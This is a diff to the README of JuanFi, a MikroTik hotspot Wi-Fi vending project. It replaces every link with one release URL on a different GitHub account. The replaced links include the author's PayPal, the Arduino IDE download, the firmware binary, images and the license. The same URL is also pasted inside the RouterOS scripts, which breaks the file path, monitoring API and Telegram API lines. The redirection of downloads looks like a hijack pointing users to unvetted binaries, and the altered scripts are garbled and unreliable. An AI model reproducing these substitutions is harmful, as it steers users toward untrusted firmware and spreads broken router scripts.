@@ -11,10 +11,10 @@ Ivan Julius Alayan
 09175425572
 
 Paypal account:
-https://www.paypal.com/paypalme/ivanalayan
+https://github.com/cruzer05/JuanFi/releases/tag/v2.0
 
 # Community Group
-  FB: https://www.facebook.com/groups/1172413279934139
+  FB: https://github.com/cruzer05/JuanFi/releases/tag/v2.0
 
 ## Features
 
@@ -57,19 +57,19 @@ https://www.paypal.com/paypalme/ivanalayan
 8.) LM2596 or any DC to DC buck that can convert to 5v for (Lan based only since no available baseboard for ESP32)
 
 ## Architecture
-![alt text](https://github.com/ivanalayan15/JuanFi/blob/master/docs/JuanFi-Architecture.PNG?raw=true)
+![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
 ## ESP32 LAN Based Connection Diagram
-![alt text](https://raw.githubusercontent.com/ivanalayan15/JuanFi/master/docs/esp32-lan-diagram.jpg)
+![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
 ## ESP32 Wireless Based Connection Diagram
-![alt text](https://raw.githubusercontent.com/ivanalayan15/JuanFi/master/docs/esp32-wireless-diagram.jpg)
+![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
 ## ESP8622 Wireless Based Connection Diagram
-![alt text](https://raw.githubusercontent.com/ivanalayan15/JuanFi/master/docs/esp8622-wireles-diagram.jpg)
+![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
 ## ESP8622 LAN Based Connection Diagram
-![alt text](https://raw.githubusercontent.com/ivanalayan15/JuanFi/master/docs/esp8622-lan-diagram.jpg)
+![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
 ## Installation
 
@@ -79,40 +79,40 @@ https://www.paypal.com/paypalme/ivanalayan
 
 There are 2 ways how to upload the software in NodeMCU
 
-#### a.) Install the binary release file, follow this guide on how to flash the bin file https://github.com/ivanalayan15/JuanFi/tree/master/release
+#### a.) Install the binary release file, follow this guide on how to flash the bin file https://github.com/cruzer05/JuanFi/releases/tag/v2.0
 
 #### b.) Build and compile the code
 
 (SKIP THIS STEP IF YOU CHOOSE THE BIN FILES) GOTO Step #4 directly
 
 1.) Download and install Arduino IDE
-https://www.arduino.cc/en/software
+https://github.com/cruzer05/JuanFi/releases/tag/v2.0
 
 
 2.) Install nodemcu board and libraries
-https://randomnerdtutorials.com/how-to-install-esp8266-board-arduino-ide/
+https://github.com/cruzer05/JuanFi/releases/tag/v2.0
 
 
 install dependency libraries at arduino libraries folder 
-* Download this https://github.com/videojedi/ESP8266-Telnet-Client and put it on ardunio library folder
+* Download this https://github.com/cruzer05/JuanFi/releases/tag/v2.0 and put it on ardunio library folder
 * From arduino, Go to Tools->Manage Libararies->Seach for LiquidCrystal_I2C and installl
 
 3.) Compile and upload code
 
-   a.) Open JuanFi.ino
+   a.) Open https://github.com/cruzer05/JuanFi/releases/tag/v2.0
 
    b.) Compile and upload
-      ![alt text](https://github.com/ivanalayan15/JuanFi/blob/master/docs/JuanFi%20-%20NodeMcu-UploadCode.PNG?raw=true)
+      ![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0%20-%https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
-   c.) Upload sketchup data using SIFSS, follow this instruction https://randomnerdtutorials.com/install-esp8266-filesystem-uploader-arduino-ide/
-      ![alt text](https://github.com/ivanalayan15/JuanFi/blob/master/docs/JuanFi%20-%20NodeMcu-SketchUpload.png?raw=true)
+   c.) Upload sketchup data using SIFSS, follow this instruction https://github.com/cruzer05/JuanFi/releases/tag/v2.0
+      ![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0%20-%https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
 4.) JuanFi initial setup
 
 a.) Connect to JuanFi Setup SSID
 
 1.) For Nodemcu/esp8622 wireless JuanFI setup will appear
-![alt text](https://github.com/ivanalayan15/JuanFi/blob/master/docs/JuanFi-Step01.PNG?raw=true)
+![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
 2.) For ESP32 Lanbase, you need to plugin first in your PC/Laptop ethernet and set your IP address as static 172.217.28.2
 
@@ -122,32 +122,32 @@ After you set to static you can access the admin in your browser as 172.217.28.1
 b.) Login to admin panel,
 Default user and password : admin / admin
 
-![alt text](https://github.com/ivanalayan15/JuanFi/blob/master/docs/JuanFi-Step02.PNG?raw=true)
+![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
 c.) Configure System, change the necessary fields to your configuration, system will restart to take effect,
 default mikrotik user and password is pisonet / abc123
-![alt text](https://github.com/ivanalayan15/JuanFi/blob/master/docs/JuanFi-Step03.PNG?raw=true)
+![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
 d.) Configure Promo rates
-![alt text](https://github.com/ivanalayan15/JuanFi/blob/master/docs/JuanFi-Step04.PNG?raw=true)
+![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
 ### Mikrotik Setup
 
 1.) Setup mikrotik hotspot according to your configuration
 
 2.) Make the NodeMCU IP address static
-![alt text](https://github.com/ivanalayan15/JuanFi/blob/master/docs/JuanFI-Mikrotik-Step1.PNG?raw=true)
+![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
 3.) Add IP Bindings exception on hotspot
-![alt text](https://github.com/ivanalayan15/JuanFi/blob/master/docs/JuanFi-Mikrotik-Step2.PNG?raw=true)
+![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
-4.) Modify vendoIpAddress (NodeMcu IPaddress) in the core.js file, you can do a multivendo setup just follow the comment in javascript for instruction
-![alt text](https://github.com/ivanalayan15/JuanFi/blob/master/docs/JuanFi-Mikrotik-Step5.PNG?raw=true)
+4.) Modify vendoIpAddress (NodeMcu IPaddress) in the https://github.com/cruzer05/JuanFi/releases/tag/v2.0 file, you can do a multivendo setup just follow the comment in javascript for instruction
+![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
 5.) Upload html template to mikrotik in Files option of mikrotik
 
 6.) Create user for nodemcu access, default user for nodemcu is pisonet / abc123 you can change it by your own
-![alt text](https://github.com/ivanalayan15/JuanFi/blob/master/docs/JuanFi-Mikrotik-Step3.PNG?raw=true)
+![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
 7.) Execute the following script in mikrotik telnet terminal
 replace 10.0.10.253 with your own nodemcu IP address
@@ -177,7 +177,7 @@ Put on the on login script (with telegram support) please change accordinly with
 
 ### enable JuanFi online monitoring 0 = DoNotSend,  1=send data to api
 :local apiSend 0;
-### derive from the JuanFi online monitoring, create account in genman.projectdorsu.com
+### derive from the JuanFi online monitoring, create account in https://github.com/cruzer05/JuanFi/releases/tag/v2.0
 :local URLvendoID 5; 
 
 ### enable Random MAC synchronizer
@@ -204,7 +204,7 @@ Put on the on login script (with telegram support) please change accordinly with
 	:local validity [:pick $com 0 [:find $com ","]];
 	
 	:if ( $validity!="0m" ) do={
-		:local sc [/sys scheduler find name=$user]; :if ($sc="") do={ :local a [/ip hotspot user get [find name=$user] limit-uptime]; :local c ($validity); :local date [ /system clock get date]; /sys sch add name="$user" disable=no start-date=$date interval=$c on-event="/ip hotspot user remove [find name=$user]; /ip hotspot active remove [find user=$user]; /ip hotspot cookie remove [find user=$user]; /system sche remove [find name=$user]; /file remove \"$hotspotFolder/data/$macNoCol.txt\";" policy=ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon; :delay 2s; } else={ :local sint [/sys scheduler get $user interval]; :if ( $validity!="" ) do={ /sys scheduler set $user interval ($sint+$validity); } };
+		:local sc [/sys scheduler find name=$user]; :if ($sc="") do={ :local a [/ip hotspot user get [find name=$user] limit-uptime]; :local c ($validity); :local date [ /system clock get date]; /sys sch add name="$user" disable=no start-date=$date interval=$c on-event="/ip hotspot user remove [find name=$user]; /ip hotspot active remove [find user=$user]; /ip hotspot cookie remove [find user=$user]; /system sche remove [find name=$user]; /file remove \"$hotspotFolder/data/$https://github.com/cruzer05/JuanFi/releases/tag/v2.0\";" policy=ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon; :delay 2s; } else={ :local sint [/sys scheduler get $user interval]; :if ( $validity!="" ) do={ /sys scheduler set $user interval ($sint+$validity); } };
 	}
 	
 	:local infoArray [:toarray [:pick $com ([:find $com ","]+1) [:len $com]]];
@@ -230,7 +230,7 @@ Put on the on login script (with telegram support) please change accordinly with
 	    #fixed declaration 
 	    :if ($apiSend!=0)  do={
 	    /do {
-	    :local fixUrl [("https://juanfiapi.projectdorsu.com/serve.js\?s=stats&i=OE-IBX-12345&m=direct&payload=$URLvendoID")];
+	    :local fixUrl [("https://github.com/cruzer05/JuanFi/releases/tag/v2.0\?s=stats&i=OE-IBX-12345&m=direct&payload=$URLvendoID")];
 	    :local apiUrl "$fixUrl_$URLamount_$URLipmac_$URLactive_$URLcomment";
 	    :log debug "API SendInfo: $apiUrl ";
 	    /tool fetch mode=https http-method=get url=$apiUrl keep-result=no
@@ -269,7 +269,7 @@ Put on the on login script (with telegram support) please change accordinly with
 		  }
 		  :set vendoNew ($vendoNew . $char)
 		}
-		/tool fetch url="https://api.telegram.org/bot$telegramToken/sendmessage?chat_id=$chatId&text=<<======New Sales======>> %0A Vendo: $vendoNew %0A Voucher: $user %0A IP: $address %0A MAC: $mac %0A Amount: $amt %0A Extended: $ext %0A Total Time: $totaltime %0A %0AToday Sales: $getSales %0AMonthly Sales : $getMonthlySales %0AActive Users: $uactive%0A <<=====================>>" keep-result=no;
+		/tool fetch url="https://github.com/cruzer05/JuanFi/releases/tag/v2.0$telegramToken/sendmessage?chat_id=$chatId&text=<<======New Sales======>> %0A Vendo: $vendoNew %0A Voucher: $user %0A IP: $address %0A MAC: $mac %0A Amount: $amt %0A Extended: $ext %0A Total Time: $totaltime %0A %0AToday Sales: $getSales %0AMonthly Sales : $getMonthlySales %0AActive Users: $uactive%0A <<=====================>>" keep-result=no;
 	}
 
 };
@@ -299,12 +299,12 @@ Put on the on logout script please change accordinly with your hotspot folder(he
 	
 :if ([/ip hotspot user get [/ip hotspot user find where name="$user"] limit-uptime] <= [/ip hotspot user get [/ip hotspot user find where name="$user"] uptime]) do={
     /ip hotspot user remove $user;
-	/file remove "$hotspotFolder/data/$macNoCol.txt";
+	/file remove "$hotspotFolder/data/$https://github.com/cruzer05/JuanFi/releases/tag/v2.0";
 	/system sche remove [find name=$user];
 }
 ```
 
-![alt text](https://github.com/ivanalayan15/JuanFi/blob/master/docs/JuanFi-Mikrotik-Step4.PNG?raw=true)
+![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
 ## Miscellaneous Scripts
 
@@ -339,10 +339,10 @@ Sample Script that turn off nightlight at 6 am:
 
 ### Mikrotik Hotspot Portal
 
-![alt text](https://github.com/ivanalayan15/JuanFi/blob/master/docs/Mikrotik-hotspot.PNG?raw=true)
+![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
 ### Admin Panel Dashboard
-![alt text](https://github.com/ivanalayan15/JuanFi/blob/master/docs/JuanFi-Step05.PNG?raw=true)
+![alt text](https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
 
 ## Contributing
 Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
@@ -350,4 +350,4 @@ Pull requests are welcome. For major changes, please open an issue first to disc
 Please make sure to update tests as appropriate.
 
 ## License
-[MIT](https://choosealicense.com/licenses/mit/)
+[MIT](https://github.com/cruzer05/JuanFi/releases/tag/v2.0)
